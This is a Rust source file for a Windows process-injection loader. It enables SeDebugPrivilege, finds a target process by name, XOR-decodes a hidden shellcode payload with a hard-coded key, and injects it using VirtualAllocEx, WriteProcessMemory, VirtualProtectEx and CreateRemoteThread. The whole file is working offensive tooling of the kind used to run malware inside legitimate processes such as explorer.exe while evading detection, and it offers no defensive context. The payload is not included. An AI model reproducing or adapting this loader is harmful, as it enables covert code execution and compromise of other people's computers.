// use winapi
use std::env::args;
use std::ptr;
use std::ffi::{CStr, CString};
use winapi::ctypes::{c_void, c_ulong};
use winapi::um::processthreadsapi::{OpenProcess, CreateRemoteThread, OpenProcessToken, GetCurrentProcess};
use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory, VirtualProtectEx};
use winapi::shared::ntdef::{HANDLE, NULL, PVOID};
use winapi::shared::minwindef::{FALSE, LPVOID, TRUE};
use winapi::shared::basetsd::ULONG_PTR;
use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
use winapi::um::tlhelp32::{CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32, TH32CS_SNAPPROCESS};
use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, PROCESS_ALL_ACCESS};
use winapi::um::securitybaseapi::{AdjustTokenPrivileges};
use winapi::um::minwinbase::SECURITY_ATTRIBUTES;
use winapi::um::winbase::LookupPrivilegeValueA;
use winapi::um::winnt::{TOKEN_ADJUST_PRIVILEGES, TOKEN_QUERY, SE_PRIVILEGE_ENABLED, LUID, TOKEN_PRIVILEGES, PROCESS_QUERY_INFORMATION};

mod shellcode;
use shellcode::get_payload;

fn xor_by_input_key(shellcode: &mut Vec<u8>, key: &Vec<u8>) {
    let key_len = key.len();
    if key_len == 0 {
        return;
    }

    for (i, byte) in shellcode.iter_mut().enumerate() {
        *byte ^= key[i % key_len]; // Cyclic XOR key
    }
}

fn enable_se_debug_privilege() -> Result<(), String> {
    unsafe {
        // Open the current process token
        let mut h_token = ptr::null_mut();
        if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &mut h_token) == 0 {
            return Err("Failed to open process token".to_string());
        }

        // Lookup the LUID for SeDebugPrivilege
        let se_debug_name = CString::new("SeDebugPrivilege").unwrap();
        let mut luid: LUID = std::mem::zeroed();
        if LookupPrivilegeValueA(ptr::null_mut(), se_debug_name.as_ptr(), &mut luid) == 0 {
            return Err("Failed to lookup privilege value".to_string());
        }

        // Enable the privilege
        let mut tp: TOKEN_PRIVILEGES = std::mem::zeroed();
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        if AdjustTokenPrivileges(h_token, FALSE, &mut tp, std::mem::size_of::<TOKEN_PRIVILEGES>() as u32, ptr::null_mut(), ptr::null_mut()) == 0 {
            return Err("Failed to adjust token privileges".to_string());
        }

        Ok(())
    }
}

fn get_process_id(name: &str) -> Option<c_ulong> {
    unsafe {
        // Take a snapshot of all running processes
        let h_snap = CreateToolhelp32Snapshot(winapi::um::tlhelp32::TH32CS_SNAPPROCESS, 0);
        if h_snap == INVALID_HANDLE_VALUE {
            return None;
        }

        let mut pe32: PROCESSENTRY32 = std::mem::zeroed();
        pe32.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;

        // Iterate over processes
        if Process32First(h_snap, &mut pe32) == TRUE {
            loop {
                let exe_name = CStr::from_ptr(pe32.szExeFile.as_ptr()).to_string_lossy();
                if exe_name == name {
                    let pid = pe32.th32ProcessID;
                    CloseHandle(h_snap);
                    return Some(pid);
                }

                if Process32Next(h_snap, &mut pe32) == FALSE {
                    break;
                }
            }
        }
        CloseHandle(h_snap);
    }
    None
}


fn inject(h_proc: HANDLE) {

    let mut r_ptr: PVOID = NULL;
	let mut bytes_written: ULONG_PTR = 0;
	let mut old_protection: c_ulong = 0;

    // load encoded shellcode
    let mut shellcode = get_payload();
    let shellcode_size: ULONG_PTR = shellcode.len();

    // decode shellcode
    let key = vec![
        0xED, 0x3A, 0x45, 0x89, 0x5F, 0xC1, 0x9B, 0x27,
        0x63, 0xB8, 0xE4, 0x9F, 0xD0, 0x6C, 0x2A, 0x71,
        0xAD, 0x4E, 0x53, 0x96, 0x37, 0xA9, 0x7B, 0xCD,
        0xFA, 0x12, 0xBE, 0x38, 0x5A, 0xF1, 0x84, 0x6D,
        0xF9, 0x3D, 0x21, 0x67, 0x9A, 0xE7, 0xC8, 0x5B,
        0xD3, 0xA1, 0x7F, 0x49, 0x36, 0xC0, 0xEE, 0x8B,
        0x4A, 0x73, 0x90, 0xD5, 0x2E, 0xF7, 0x61, 0xB2,
        0x81, 0x15, 0xC6, 0x9E, 0x50, 0xDB, 0x3C, 0x24
    ];
    xor_by_input_key(&mut shellcode, &key);
    //println!("[+] Decoded Shellcode successfully");

    // VirtualAllocEx
    r_ptr = unsafe { VirtualAllocEx(h_proc, ptr::null_mut(), shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) };
    
    if r_ptr.is_null() {
        println!("[-] Failed using VirtualAllocEx at {:x?}", h_proc);
    }
    //println!("[+] Allocated memory succesfully to {:x?}", h_proc);

    // WriteProcessMemory
    let w_mem = unsafe { WriteProcessMemory(h_proc, r_ptr, shellcode.as_mut_ptr() as *const c_void, shellcode_size, &mut bytes_written) };
    if w_mem == 0 {
        println!("[-] Failed to write process memory");
        return;
    }
    //println!("[+] Shellcode written successfully to target process");

    // VirtualProtectEx
    let _ = unsafe { VirtualProtectEx(h_proc, r_ptr, shellcode_size, PAGE_EXECUTE_READWRITE, &mut old_protection) };
    println!("[+] Succesfully completed VirtualProtectEx");

    // CreateRemoteThread
    let mut h_thread_id: c_ulong = 0;
    let mut h_thread: HANDLE = NULL;
    h_thread = unsafe { CreateRemoteThread(h_proc, 0 as *mut SECURITY_ATTRIBUTES, 0, Some(*(&r_ptr as *const _ as *const extern "system" fn(LPVOID) -> u32)), ptr::null_mut(), 0, &mut h_thread_id) };
    if h_thread == NULL {
        println!("[-] Failed CreateRemoteThread");
        return;
    }
    //println!("[+] Succesfully completed CreateRemoteThread");
    
    unsafe { 
        CloseHandle(h_proc);
        CloseHandle(h_thread);
    }

}

fn main() {
    // Open file
    let args: Vec<String> = args().collect();
    if args.len() < 2 {
        println!("Not enough arguments\nmain.exe <Target process's name>");
        println!("Not enough arguments\nmain.exe explorer.exe");
        return;
    }

    // enable SeDebugPrivilege
    let _ = enable_se_debug_privilege();

    // get pid target process
    let pid = match get_process_id(args[1].as_str()) {
        Some(pid) => {
            println!("Process ID of {}: {}", args[1], pid);
            pid
        }
        _ => {
            println!("Process not found.");
            0
        }
    };

    // open process
    let h_proc: HANDLE = unsafe { OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid ) };

    // begin injection
    inject(h_proc);
    
    println!("[+] DONE! BYE BYE :)")
    
}